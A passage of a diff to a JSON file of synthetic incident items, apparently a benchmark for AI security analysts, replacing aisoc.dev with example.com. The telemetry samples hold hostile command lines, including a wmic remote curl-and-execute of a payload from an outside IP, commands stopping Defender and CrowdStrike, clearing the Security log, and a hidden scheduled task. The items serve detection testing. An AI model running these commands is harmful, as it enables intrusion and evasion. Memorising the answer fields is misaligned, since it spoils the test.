     "description": "New value written to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run on LIN-DB-REPLICA. Points to roaming binary signed with revoked cert. Linked to Lazarus.",
     "expected_tactics": [
       "TA0003"
@@ -3025,7 +3025,7 @@
       "persistence",
       "revoked cert",
       "LIN-DB-REPLICA",
-      "svc-backup@aisoc.dev",
+      "svc-backup@example.com",
       "Lazarus"
     ],
     "telemetry": [
@@ -3035,17 +3035,17 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 13,
         "Computer": "LIN-DB-REPLICA",
-        "User": "svc-backup@aisoc.dev",
+        "User": "svc-backup@example.com",
         "EventType": "SetValue",
         "TargetObject": "HKU\\S-1-5-21-...\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
-        "Details": "C:\\Users\\svc-backup@aisoc.dev\\AppData\\Roaming\\updater.exe"
+        "Details": "C:\\Users\\svc-backup@example.com\\AppData\\Roaming\\updater.exe"
       },
       {
         "source": "edr",
         "rule": "Persistence: Registry Run with revoked-cert signed binary",
         "severity": "high",
         "Computer": "LIN-DB-REPLICA",
-        "User": "svc-backup@aisoc.dev",
+        "User": "svc-backup@example.com",
         "threat_actor": "Lazarus"
       }
     ]
@@ -3055,7 +3055,7 @@
     "template_id": "scheduled-task-persistence",
     "template_index": 11,
     "title": "Scheduled task persistence on AWS-EC2-PROD-API",
-    "description": "Hidden scheduled task created on AWS-EC2-PROD-API by cfo@aisoc.dev: triggers every 30 minutes, runs script from %APPDATA%\\Roaming. Persistence mechanism.",
+    "description": "Hidden scheduled task created on AWS-EC2-PROD-API by cfo@example.com: triggers every 30 minutes, runs script from %APPDATA%\\Roaming. Persistence mechanism.",
     "expected_tactics": [
       "TA0003"
     ],
@@ -3069,7 +3069,7 @@
       "persistence",
       "APPDATA",
       "AWS-EC2-PROD-API",
-      "cfo@aisoc.dev"
+      "cfo@example.com"
     ],
     "telemetry": [
       {
@@ -3078,7 +3078,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4698,
         "Computer": "AWS-EC2-PROD-API",
-        "SubjectUserName": "cfo@aisoc.dev",
+        "SubjectUserName": "cfo@example.com",
         "TaskName": "\\Microsoft\\Windows\\UpdaterTask",
         "TaskContent": "<Hidden>true</Hidden><Exec>%APPDATA%\\Roaming\\u.ps1</Exec>"
       },
@@ -3091,7 +3091,7 @@
         "Image": "C:\\Windows\\System32\\schtasks.exe",
         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
         "CommandLine": "schtasks /Create /SC MINUTE /MO 30 /TN UpdaterTask /TR \"powershell -f %APPDATA%\\Roaming\\u.ps1\" /F",
-        "User": "cfo@aisoc.dev"
+        "User": "cfo@example.com"
       }
     ]
   },
@@ -3143,7 +3143,7 @@
     "template_id": "cron-backdoor",
     "template_index": 13,
     "title": "Backdoor cron job installed on LIN-DB-REPLICA",
-    "description": "/etc/cron.d entry created by ceo@aisoc.dev on LIN-DB-REPLICA. Reverse shell beacon to 45.142.122.111 every 5 minutes.",
+    "description": "/etc/cron.d entry created by ceo@example.com on LIN-DB-REPLICA. Reverse shell beacon to 45.142.122.111 every 5 minutes.",
     "expected_tactics": [
       "TA0003",
       "TA0011"
@@ -3159,7 +3159,7 @@
       "backdoor",
       "reverse shell",
       "LIN-DB-REPLICA",
-      "ceo@aisoc.dev",
+      "ceo@example.com",
       "45.142.122.111"
     ],
     "telemetry": [
@@ -3170,7 +3170,7 @@
         "exe": "/usr/bin/vi",
         "path": "/etc/cron.d/zz-update",
         "hostname": "LIN-DB-REPLICA",
-        "user": "ceo@aisoc.dev",
+        "user": "ceo@example.com",
         "a2": "O_WRONLY|O_CREAT"
       },
       {
@@ -3186,7 +3186,7 @@
     "template_id": "uac-bypass-fodhelper",
     "template_index": 14,
     "title": "UAC bypass observed on LIN-BUILD-CI03",
-    "description": "fodhelper.exe abuse on LIN-BUILD-CI03 by eve@aisoc.dev; auto-elevation triggered without prompt. Process tree shows escalation to SYSTEM.",
+    "description": "fodhelper.exe abuse on LIN-BUILD-CI03 by eve@example.com; auto-elevation triggered without prompt. Process tree shows escalation to SYSTEM.",
     "expected_tactics": [
       "TA0004",
       "TA0005"
@@ -3201,7 +3201,7 @@
       "fodhelper",
       "auto-elevation",
       "LIN-BUILD-CI03",
-      "eve@aisoc.dev",
+      "eve@example.com",
       "SYSTEM"
     ],
     "telemetry": [
@@ -3211,7 +3211,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 13,
         "Computer": "LIN-BUILD-CI03",
-        "User": "eve@aisoc.dev",
+        "User": "eve@example.com",
         "EventType": "SetValue",
         "TargetObject": "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command",
         "Details": "C:\\Windows\\System32\\cmd.exe /c whoami"
@@ -3234,7 +3234,7 @@
     "template_id": "k8s-privileged-pod-escape",
     "template_index": 15,
     "title": "Container escape via privileged pod on WIN-PROD-WEB02",
-    "description": "Kubernetes privileged pod created on WIN-PROD-WEB02 by dave@aisoc.dev. cgroup escape to host namespace observed. Node filesystem accessed.",
+    "description": "Kubernetes privileged pod created on WIN-PROD-WEB02 by dave@example.com. cgroup escape to host namespace observed. Node filesystem accessed.",
     "expected_tactics": [
       "TA0004",
       "TA0007"
@@ -3251,7 +3251,7 @@
       "container escape",
       "cgroup",
       "WIN-PROD-WEB02",
-      "dave@aisoc.dev"
+      "dave@example.com"
     ],
     "telemetry": [
       {
@@ -3263,7 +3263,7 @@
           "resource": "pods"
         },
         "user": {
-          "username": "dave@aisoc.dev"
+          "username": "dave@example.com"
         },
         "requestObject": {
           "spec": {
@@ -3301,7 +3301,7 @@
     "template_id": "linux-suid-abuse",
     "template_index": 16,
     "title": "Linux SUID binary abuse on WIN-DEVOPS-LT",
-    "description": "Custom SUID binary discovered in /tmp on WIN-DEVOPS-LT; allows arbitrary command execution as root. Likely escalation by bob@aisoc.dev.",
+    "description": "Custom SUID binary discovered in /tmp on WIN-DEVOPS-LT; allows arbitrary command execution as root. Likely escalation by bob@example.com.",
     "expected_tactics": [
       "TA0004"
     ],
@@ -3315,7 +3315,7 @@
       "/tmp",
       "root escalation",
       "WIN-DEVOPS-LT",
-      "bob@aisoc.dev"
+      "bob@example.com"
     ],
     "telemetry": [
       {
@@ -3326,7 +3326,7 @@
         "a1": "/tmp/.x",
         "mode": "04755",
         "hostname": "WIN-DEVOPS-LT",
-        "user": "bob@aisoc.dev"
+        "user": "bob@example.com"
       },
       {
         "source": "linux_auditd",
@@ -3336,7 +3336,7 @@
         "hostname": "WIN-DEVOPS-LT",
         "uid": 1001,
         "euid": 0,
-        "user": "bob@aisoc.dev"
+        "user": "bob@example.com"
       }
     ]
   },
@@ -3402,7 +3402,7 @@
     "template_id": "event-log-cleared",
     "template_index": 18,
     "title": "Indicator removal: Windows event log cleared on AZURE-VM-FIN-001",
-    "description": "Security event log cleared on AZURE-VM-FIN-001 by heidi@aisoc.dev. wevtutil.exe cl Security observed in command-line telemetry.",
+    "description": "Security event log cleared on AZURE-VM-FIN-001 by heidi@example.com. wevtutil.exe cl Security observed in command-line telemetry.",
     "expected_tactics": [
       "TA0005"
     ],
@@ -3416,7 +3416,7 @@
       "log cleared",
       "indicator removal",
       "AZURE-VM-FIN-001",
-      "heidi@aisoc.dev"
+      "heidi@example.com"
     ],
     "telemetry": [
       {
@@ -3425,7 +3425,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 1102,
         "Computer": "AZURE-VM-FIN-001",
-        "SubjectUserName": "heidi@aisoc.dev",
+        "SubjectUserName": "heidi@example.com",
         "Channel": "Security",
         "Description": "The audit log was cleared."
       },
@@ -3435,7 +3435,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "AZURE-VM-FIN-001",
-        "User": "heidi@aisoc.dev",
+        "User": "heidi@example.com",
         "Image": "C:\\Windows\\System32\\wevtutil.exe",
         "CommandLine": "wevtutil cl Security"
       }
@@ -3446,7 +3446,7 @@
     "template_id": "disable-edr-tooling",
     "template_index": 19,
     "title": "Disable security tooling on LIN-OBS-LOGGER",
-    "description": "admin@aisoc.dev attempted to stop Defender, CrowdStrike, and Sysmon on LIN-OBS-LOGGER. Tampering telemetry triggered alert.",
+    "description": "admin@example.com attempted to stop Defender, CrowdStrike, and Sysmon on LIN-OBS-LOGGER. Tampering telemetry triggered alert.",
     "expected_tactics": [
       "TA0005"
     ],
@@ -3461,7 +3461,7 @@
       "sysmon",
       "tampering",
       "LIN-OBS-LOGGER",
-      "admin@aisoc.dev"
+      "admin@example.com"
     ],
     "telemetry": [
       {
@@ -3470,7 +3470,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "LIN-OBS-LOGGER",
-        "User": "admin@aisoc.dev",
+        "User": "admin@example.com",
         "Image": "C:\\Windows\\System32\\sc.exe",
         "CommandLine": "sc.exe stop CSAgent"
       },
@@ -3480,7 +3480,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "LIN-OBS-LOGGER",
-        "User": "admin@aisoc.dev",
+        "User": "admin@example.com",
         "Image": "C:\\Windows\\System32\\sc.exe",
         "CommandLine": "sc.exe stop WinDefend"
       },
@@ -3489,7 +3489,7 @@
         "rule": "EDR tampering attempt",
         "severity": "critical",
         "Computer": "LIN-OBS-LOGGER",
-        "User": "admin@aisoc.dev"
+        "User": "admin@example.com"
       }
     ]
   },
@@ -3497,7 +3497,7 @@
     "id": "INC-EVAL-076",
     "template_id": "lsass-memory-dump",
     "template_index": 20,
-    "title": "LSASS memory dump on WIN-DEVOPS-LT by cfo@aisoc.dev",
+    "title": "LSASS memory dump on WIN-DEVOPS-LT by cfo@example.com",
     "description": "comsvcs.dll MiniDump observed on WIN-DEVOPS-LT. lsass.exe memory dumped to C:\\Windows\\Temp\\. Mimikatz signatures detected.",
     "expected_tactics": [
       "TA0006"
@@ -3513,7 +3513,7 @@
       "comsvcs",
       "mimikatz",
       "WIN-DEVOPS-LT",
-      "cfo@aisoc.dev"
+      "cfo@example.com"
     ],
     "telemetry": [
       {
@@ -3526,7 +3526,7 @@
         "TargetImage": "C:\\Windows\\System32\\lsass.exe",
         "GrantedAccess": "0x1010",
         "CallTrace": "comsvcs.dll+5d24|MiniDumpWriteDump",
-        "User": "cfo@aisoc.dev"
+        "User": "cfo@example.com"
       },
       {
         "source": "sysmon",
@@ -3536,7 +3536,7 @@
         "Computer": "WIN-DEVOPS-LT",
         "Image": "C:\\Windows\\System32\\rundll32.exe",
         "TargetFilename": "C:\\Windows\\Temp\\lsass.dmp",
-        "User": "cfo@aisoc.dev"
+        "User": "cfo@example.com"
       }
     ]
   },
@@ -3544,8 +3544,8 @@
     "id": "INC-EVAL-077",
     "template_id": "credential-spray",
     "template_index": 21,
-    "title": "Brute-force credential spray against dave@aisoc.dev from 172.16.50.7",
-    "description": "Credential spray from 172.16.50.7 against dave@aisoc.dev. 1500 password attempts in 30 minutes. One success followed by anomalous Azure AD sign-in.",
+    "title": "Brute-force credential spray against dave@example.com from 172.16.50.7",
+    "description": "Credential spray from 172.16.50.7 against dave@example.com. 1500 password attempts in 30 minutes. One success followed by anomalous Azure AD sign-in.",
     "expected_tactics": [
       "TA0006"
     ],
@@ -3557,7 +3557,7 @@
     "evidence_keywords": [
       "brute force",
       "credential spray",
-      "dave@aisoc.dev",
+      "dave@example.com",
       "172.16.50.7",
       "azure ad"
     ],
@@ -3565,7 +3565,7 @@
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "dave@aisoc.dev",
+        "userPrincipalName": "dave@example.com",
         "ipAddress": "172.16.50.7",
         "resultType": 50126,
         "resultDescription": "Invalid username or password",
@@ -3575,7 +3575,7 @@
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "dave@aisoc.dev",
+        "userPrincipalName": "dave@example.com",
         "ipAddress": "172.16.50.7",
         "resultType": 0,
         "resultDescription": "Success",
@@ -3589,7 +3589,7 @@
     "template_id": "kerberoasting",
     "template_index": 22,
     "title": "Kerberoasting from WIN-FILE-SHARE",
-    "description": "Service account TGS tickets requested en-masse from WIN-FILE-SHARE by cfo@aisoc.dev. AES256 \u2192 RC4 downgrade observed. Mimikatz tooling indicators.",
+    "description": "Service account TGS tickets requested en-masse from WIN-FILE-SHARE by cfo@example.com. AES256 \u2192 RC4 downgrade observed. Mimikatz tooling indicators.",
     "expected_tactics": [
       "TA0006",
       "TA0008"
@@ -3606,7 +3606,7 @@
       "RC4",
       "mimikatz",
       "WIN-FILE-SHARE",
-      "cfo@aisoc.dev"
+      "cfo@example.com"
     ],
     "telemetry": [
       {
@@ -3615,8 +3615,8 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4769,
         "Computer": "WIN-DC-PRIMARY",
-        "TargetUserName": "cfo@aisoc.dev",
-        "ServiceName": "MSSQLSvc/sql.aisoc.dev",
+        "TargetUserName": "cfo@example.com",
+        "ServiceName": "MSSQLSvc/sql.example.com",
         "TicketEncryptionType": "0x17",
         "IpAddress": "WIN-FILE-SHARE"
       },
@@ -3626,8 +3626,8 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4769,
         "Computer": "WIN-DC-PRIMARY",
-        "TargetUserName": "cfo@aisoc.dev",
-        "ServiceName": "HTTP/web01.aisoc.dev",
+        "TargetUserName": "cfo@example.com",
+        "ServiceName": "HTTP/web01.example.com",
         "TicketEncryptionType": "0x17",
         "IpAddress": "WIN-FILE-SHARE"
       }
@@ -3638,7 +3638,7 @@
     "template_id": "ad-dcsync",
     "template_index": 23,
     "title": "Active Directory DCSync from non-DC host AZURE-VM-FIN-001",
-    "description": "Replication rights abused from AZURE-VM-FIN-001 by ops-lead@aisoc.dev. All domain NTLM hashes replicated. Severe credential exposure.",
+    "description": "Replication rights abused from AZURE-VM-FIN-001 by ops-lead@example.com. All domain NTLM hashes replicated. Severe credential exposure.",
     "expected_tactics": [
       "TA0006",
       "TA0004"
@@ -3654,7 +3654,7 @@
       "replication",
       "ntlm hash",
       "AZURE-VM-FIN-001",
-      "ops-lead@aisoc.dev"
+      "ops-lead@example.com"
     ],
     "telemetry": [
       {
@@ -3663,7 +3663,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4662,
         "Computer": "WIN-DC-PRIMARY",
-        "SubjectUserName": "ops-lead@aisoc.dev",
+        "SubjectUserName": "ops-lead@example.com",
         "ObjectServer": "DS",
         "ObjectType": "domainDNS",
         "Properties": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
@@ -3675,8 +3675,8 @@
     "id": "INC-EVAL-080",
     "template_id": "saml-golden-ticket",
     "template_index": 24,
-    "title": "SAML golden-ticket: forged assertion targeting frank@aisoc.dev",
-    "description": "Forged SAML assertion detected for frank@aisoc.dev. Attacker pivoted to Azure AD; account enumeration followed from 10.0.99.42.",
+    "title": "SAML golden-ticket: forged assertion targeting frank@example.com",
+    "description": "Forged SAML assertion detected for frank@example.com. Attacker pivoted to Azure AD; account enumeration followed from 10.0.99.42.",
     "expected_tactics": [
       "TA0006",
       "TA0007"
@@ -3692,14 +3692,14 @@
       "golden ticket",
       "forged",
       "azure ad",
-      "frank@aisoc.dev",
+      "frank@example.com",
       "10.0.99.42"
     ],
     "telemetry": [
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "frank@aisoc.dev",
+        "userPrincipalName": "frank@example.com",
         "ipAddress": "10.0.99.42",
         "resultType": 0,
         "authenticationDetails": [
@@ -3709,13 +3709,13 @@
           }
         ],
         "tokenIssuerType": "ADFederationServices",
-        "tokenIssuerName": "forged-adfs.aisoc.dev"
+        "tokenIssuerName": "forged-adfs.example.com"
       },
       {
         "source": "m365_audit",
         "Workload": "AzureActiveDirectory",
         "Operation": "Add member to role.",
-        "UserId": "frank@aisoc.dev",
+        "UserId": "frank@example.com",
         "ModifiedProperties": [
           {
             "Name": "Role.DisplayName",
@@ -3730,7 +3730,7 @@
     "template_id": "ldap-bloodhound-discovery",
     "template_index": 25,
     "title": "Domain enumeration from LIN-OBS-LOGGER",
-    "description": "ldap discovery from LIN-OBS-LOGGER by grace@aisoc.dev: BloodHound-style queries enumerating users, groups, ACLs.",
+    "description": "ldap discovery from LIN-OBS-LOGGER by grace@example.com: BloodHound-style queries enumerating users, groups, ACLs.",
     "expected_tactics": [
       "TA0007"
     ],
@@ -3744,7 +3744,7 @@
       "bloodhound",
       "domain enumeration",
       "LIN-OBS-LOGGER",
-      "grace@aisoc.dev"
+      "grace@example.com"
     ],
     "telemetry": [
       {
@@ -3756,7 +3756,7 @@
         "Image": "C:\\Tools\\SharpHound.exe",
         "DestinationIp": "WIN-DC-PRIMARY",
         "DestinationPort": 389,
-        "User": "grace@aisoc.dev"
+        "User": "grace@example.com"
       },
       {
         "source": "windows_security",
@@ -3764,7 +3764,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4662,
         "Computer": "WIN-DC-PRIMARY",
-        "SubjectUserName": "grace@aisoc.dev",
+        "SubjectUserName": "grace@example.com",
         "ObjectType": "user",
         "AccessMask": "0x100",
         "EventCount": 8400
@@ -3776,7 +3776,7 @@
     "template_id": "smb-share-enumeration",
     "template_index": 26,
     "title": "Network share enumeration on WIN-FIN-DB01",
-    "description": "Mass SMB share enumeration from WIN-FIN-DB01 by alice@aisoc.dev; net.exe and PowerShell Get-SmbShare invocations across /24 subnet.",
+    "description": "Mass SMB share enumeration from WIN-FIN-DB01 by alice@example.com; net.exe and PowerShell Get-SmbShare invocations across /24 subnet.",
     "expected_tactics": [
       "TA0007"
     ],
@@ -3791,7 +3791,7 @@
       "Get-SmbShare",
       "share enumeration",
       "WIN-FIN-DB01",
-      "alice@aisoc.dev"
+      "alice@example.com"
     ],
     "telemetry": [
       {
@@ -3800,7 +3800,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "WIN-FIN-DB01",
-        "User": "alice@aisoc.dev",
+        "User": "alice@example.com",
         "Image": "C:\\Windows\\System32\\net.exe",
         "CommandLine": "net.exe view /domain"
       },
@@ -3810,7 +3810,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 5145,
         "Computer": "WIN-FILE-SHARE",
-        "SubjectUserName": "alice@aisoc.dev",
+        "SubjectUserName": "alice@example.com",
         "ShareName": "\\\\*\\*",
         "IpAddress": "WIN-FIN-DB01",
         "EventCount": 256
@@ -3822,7 +3822,7 @@
     "template_id": "pass-the-hash-lateral",
     "template_index": 27,
     "title": "Pass-the-hash from GCP-GKE-NODE-04 to WIN-DEVOPS-LT",
-    "description": "Pass-the-hash lateral movement from GCP-GKE-NODE-04 to WIN-DEVOPS-LT by eve@aisoc.dev. Golden ticket indicators present. Linked to MosaicRegressor.",
+    "description": "Pass-the-hash lateral movement from GCP-GKE-NODE-04 to WIN-DEVOPS-LT by eve@example.com. Golden ticket indicators present. Linked to MosaicRegressor.",
     "expected_tactics": [
       "TA0008",
       "TA0006"
@@ -3838,7 +3838,7 @@
       "golden ticket",
       "GCP-GKE-NODE-04",
       "WIN-DEVOPS-LT",
-      "eve@aisoc.dev",
+      "eve@example.com",
       "MosaicRegressor"
     ],
     "telemetry": [
@@ -3848,7 +3848,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4624,
         "Computer": "WIN-DEVOPS-LT",
-        "TargetUserName": "eve@aisoc.dev",
+        "TargetUserName": "eve@example.com",
         "LogonType": 3,
         "AuthenticationPackageName": "NTLM",
         "IpAddress": "GCP-GKE-NODE-04",
@@ -3860,7 +3860,7 @@
         "severity": "high",
         "Computer": "WIN-DEVOPS-LT",
         "Source": "GCP-GKE-NODE-04",
-        "User": "eve@aisoc.dev",
+        "User": "eve@example.com",
         "threat_actor": "MosaicRegressor"
       }
     ]
@@ -3870,7 +3870,7 @@
     "template_id": "rdp-lateral-movement",
     "template_index": 28,
     "title": "RDP lateral movement from MAC-LEGAL-LAPTOP",
-    "description": "Anomalous RDP session from MAC-LEGAL-LAPTOP (eve@aisoc.dev) to LIN-EDGE-VPN02 outside business hours. Source admin not normal for LIN-EDGE-VPN02.",
+    "description": "Anomalous RDP session from MAC-LEGAL-LAPTOP (eve@example.com) to LIN-EDGE-VPN02 outside business hours. Source admin not normal for LIN-EDGE-VPN02.",
     "expected_tactics": [
       "TA0008"
     ],
@@ -3885,7 +3885,7 @@
       "outside hours",
       "MAC-LEGAL-LAPTOP",
       "LIN-EDGE-VPN02",
-      "eve@aisoc.dev"
+      "eve@example.com"
     ],
     "telemetry": [
       {
@@ -3894,7 +3894,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4624,
         "Computer": "LIN-EDGE-VPN02",
-        "TargetUserName": "eve@aisoc.dev",
+        "TargetUserName": "eve@example.com",
         "LogonType": 10,
         "IpAddress": "MAC-LEGAL-LAPTOP",
         "LogonProcessName": "User32",
@@ -3907,7 +3907,7 @@
     "template_id": "wmi-lateral-execution",
     "template_index": 29,
     "title": "WMI lateral execution from WIN-FILE-SHARE to MAC-CFO-LAPTOP",
-    "description": "wmic.exe /node:MAC-CFO-LAPTOP process call create observed from WIN-FILE-SHARE by svc-backup@aisoc.dev. Remote command execution; payload from 91.134.231.15.",
+    "description": "wmic.exe /node:MAC-CFO-LAPTOP process call create observed from WIN-FILE-SHARE by svc-backup@example.com. Remote command execution; payload from 91.134.231.15.",
     "expected_tactics": [
       "TA0008",
       "TA0002"
@@ -3922,7 +3922,7 @@
       "lateral",
       "WIN-FILE-SHARE",
       "MAC-CFO-LAPTOP",
-      "svc-backup@aisoc.dev",
+      "svc-backup@example.com",
       "91.134.231.15"
     ],
     "telemetry": [
@@ -3932,7 +3932,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "WIN-FILE-SHARE",
-        "User": "svc-backup@aisoc.dev",
+        "User": "svc-backup@example.com",
         "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
         "CommandLine": "wmic /node:MAC-CFO-LAPTOP process call create \"cmd /c curl http://91.134.231.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
       }
@@ -3942,8 +3942,8 @@
     "id": "INC-EVAL-086",
     "template_id": "bulk-pii-download",
     "template_index": 30,
-    "title": "Bulk PII download by grace@aisoc.dev",
-    "description": "grace@aisoc.dev downloaded >10 GB of customer records from production database from WIN-EXCHANGE-01. Outside normal access pattern.",
+    "title": "Bulk PII download by grace@example.com",
+    "description": "grace@example.com downloaded >10 GB of customer records from production database from WIN-EXCHANGE-01. Outside normal access pattern.",
     "expected_tactics": [
       "TA0009",
       "TA0010"
@@ -3959,13 +3959,13 @@
       "pii",
       "customer record",
       "WIN-EXCHANGE-01",
-      "grace@aisoc.dev"
+      "grace@example.com"
     ],
     "telemetry": [
       {
         "source": "db_audit",
         "operation": "SELECT",
-        "user": "grace@aisoc.dev",
+        "user": "grace@example.com",
         "src_host": "WIN-EXCHANGE-01",
         "database": "prod_customers",
         "table": "customer_records",
@@ -3979,7 +3979,7 @@
     "template_id": "clipboard-keylogger",
     "template_index": 31,
     "title": "Clipboard logging implant on WIN-PROD-WEB02",
-    "description": "Clipboard contents from WIN-PROD-WEB02 (bob@aisoc.dev) being captured to %APPDATA%\\Local\\. Captures span 2 hours and include credentials and crypto addresses.",
+    "description": "Clipboard contents from WIN-PROD-WEB02 (bob@example.com) being captured to %APPDATA%\\Local\\. Captures span 2 hours and include credentials and crypto addresses.",
     "expected_tactics": [
       "TA0009"
     ],
@@ -3993,7 +3993,7 @@
       "keylog",
       "credentials",
       "WIN-PROD-WEB02",
-      "bob@aisoc.dev"
+      "bob@example.com"
     ],
     "telemetry": [
       {
@@ -4002,8 +4002,8 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 24,
         "Computer": "WIN-PROD-WEB02",
-        "User": "bob@aisoc.dev",
-        "Image": "C:\\Users\\bob@aisoc.dev\\AppData\\Local\\sched.exe",
+        "User": "bob@example.com",
+        "Image": "C:\\Users\\bob@example.com\\AppData\\Local\\sched.exe",
         "Hashes": "SHA256=abc..."
       },
       {
@@ -4012,9 +4012,9 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 11,
         "Computer": "WIN-PROD-WEB02",
-        "Image": "C:\\Users\\bob@aisoc.dev\\AppData\\Local\\sched.exe",
-        "TargetFilename": "C:\\Users\\bob@aisoc.dev\\AppData\\Local\\clip.log",
-        "User": "bob@aisoc.dev"
+        "Image": "C:\\Users\\bob@example.com\\AppData\\Local\\sched.exe",
+        "TargetFilename": "C:\\Users\\bob@example.com\\AppData\\Local\\clip.log",
+        "User": "bob@example.com"
       }
     ]
   },
@@ -4059,7 +4059,7 @@
     "template_id": "s3-exfil-cloud-storage",
     "template_index": 33,
     "title": "Cloud storage exfil: data egress to attacker-controlled S3 from WIN-EXCHANGE-01",
-    "description": "Egress from WIN-EXCHANGE-01 to s3://atk-stage-192.168.1.100/dump/ by bob@aisoc.dev. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
+    "description": "Egress from WIN-EXCHANGE-01 to s3://atk-stage-192.168.1.100/dump/ by bob@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
     "expected_tactics": [
       "TA0010"
     ],
@@ -4075,7 +4075,7 @@
       "exfiltrat",
       "WIN-EXCHANGE-01",
       "192.168.1.100",
-      "bob@aisoc.dev"
+      "bob@example.com"
     ],
     "telemetry": [
       {
@@ -4085,7 +4085,7 @@
         "awsRegion": "us-east-1",
         "userIdentity": {
           "type": "IAMUser",
-          "userName": "bob@aisoc.dev"
+          "userName": "bob@example.com"
         },
         "sourceIPAddress": "WIN-EXCHANGE-01",
         "requestParameters": {
@@ -4104,8 +4104,8 @@
     "id": "INC-EVAL-090",
     "template_id": "personal-drive-exfil",
     "template_index": 34,
-    "title": "Personal Drive exfil by bob@aisoc.dev",
-    "description": "bob@aisoc.dev on GCP-GKE-NODE-04 uploaded 4 GB to personal Google Drive. Files include source code and customer PII.",
+    "title": "Personal Drive exfil by bob@example.com",
+    "description": "bob@example.com on GCP-GKE-NODE-04 uploaded 4 GB to personal Google Drive. Files include source code and customer PII.",
     "expected_tactics": [
       "TA0009",
       "TA0010"
@@ -4123,7 +4123,7 @@
       "source code",
       "pii",
       "GCP-GKE-NODE-04",
-      "bob@aisoc.dev"
+      "bob@example.com"
     ],
     "telemetry": [
       {
@@ -4132,7 +4132,7 @@
         "url": "https://www.googleapis.com/upload/drive/v3/files",
         "status_code": 200,
         "src_host": "GCP-GKE-NODE-04",
-        "src_user": "bob@aisoc.dev",
+        "src_user": "bob@example.com",
         "bytes_out": 4300000000,
         "file_count": 812
       }
@@ -4227,7 +4227,7 @@
     "template_id": "ransomware-encryption",
     "template_index": 37,
     "title": "Ransomware encryption in progress on WIN-FIN-DB01",
-    "description": "Mass file rename observed on WIN-FIN-DB01 (eve@aisoc.dev); ..pwned extension applied to ~20 k files. Ransomware note R3ADM3-FIN7.txt found.",
+    "description": "Mass file rename observed on WIN-FIN-DB01 (eve@example.com); ..pwned extension applied to ~20 k files. Ransomware note R3ADM3-FIN7.txt found.",
     "expected_tactics": [
       "TA0040"
     ],
@@ -4242,7 +4242,7 @@
       "rename",
       "ransom note",
       "WIN-FIN-DB01",
-      "eve@aisoc.dev",
+      "eve@example.com",
       "FIN7"
     ],
     "telemetry": [
@@ -4253,8 +4253,8 @@
         "EventID": 11,
         "Computer": "WIN-FIN-DB01",
         "Image": "C:\\ProgramData\\enc.exe",
-        "TargetFilename": "C:\\Users\\eve@aisoc.dev\\Documents\\notes.docx.pwned",
-        "User": "eve@aisoc.dev",
+        "TargetFilename": "C:\\Users\\eve@example.com\\Documents\\notes.docx.pwned",
+        "User": "eve@example.com",
         "rename_rate_per_min": 4200
       },
       {
@@ -4264,8 +4264,8 @@
         "EventID": 11,
         "Computer": "WIN-FIN-DB01",
         "Image": "C:\\ProgramData\\enc.exe",
-        "TargetFilename": "C:\\Users\\eve@aisoc.dev\\Desktop\\R3ADM3-FIN7.txt",
-        "User": "eve@aisoc.dev"
+        "TargetFilename": "C:\\Users\\eve@example.com\\Desktop\\R3ADM3-FIN7.txt",
+        "User": "eve@example.com"
       },
       {
         "source": "edr",
@@ -4317,8 +4317,8 @@
     "id": "INC-EVAL-095",
     "template_id": "bec-wire-fraud",
     "template_index": 39,
-    "title": "BEC: payment redirect by alice@aisoc.dev",
-    "description": "Spear-phishing email spoofed CFO. Wire transfer of $250 k initiated by alice@aisoc.dev from GCP-GKE-NODE-04 to threat-actor account. Linked to APT29.",
+    "title": "BEC: payment redirect by alice@example.com",
+    "description": "Spear-phishing email spoofed CFO. Wire transfer of $250 k initiated by alice@example.com from GCP-GKE-NODE-04 to threat-actor account. Linked to APT29.",
     "expected_tactics": [
       "TA0001",
       "TA0040"
@@ -4334,7 +4334,7 @@
       "spoofed cfo",
       "wire transfer",
       "$250",
-      "alice@aisoc.dev",
+      "alice@example.com",
       "GCP-GKE-NODE-04",
       "APT29"
     ],
@@ -4343,10 +4343,10 @@
         "source": "m365_audit",
         "Workload": "Exchange",
         "Operation": "Send",
-        "UserId": "alice@aisoc.dev",
+        "UserId": "alice@example.com",
         "ClientIP": "GCP-GKE-NODE-04",
         "Subject": "URGENT: Wire instructions from CFO",
-        "From": "cfo@aisoc.dev.spoof",
+        "From": "cfo@example.com.spoof",
         "ReplyTo": "cfo-aisoc@protonmail.com",
         "threat_actor": "APT29"
       }
@@ -4383,7 +4383,7 @@
         "awsRegion": "us-east-1",
         "userIdentity": {
           "type": "IAMUser",
-          "userName": "ops-lead@aisoc.dev"
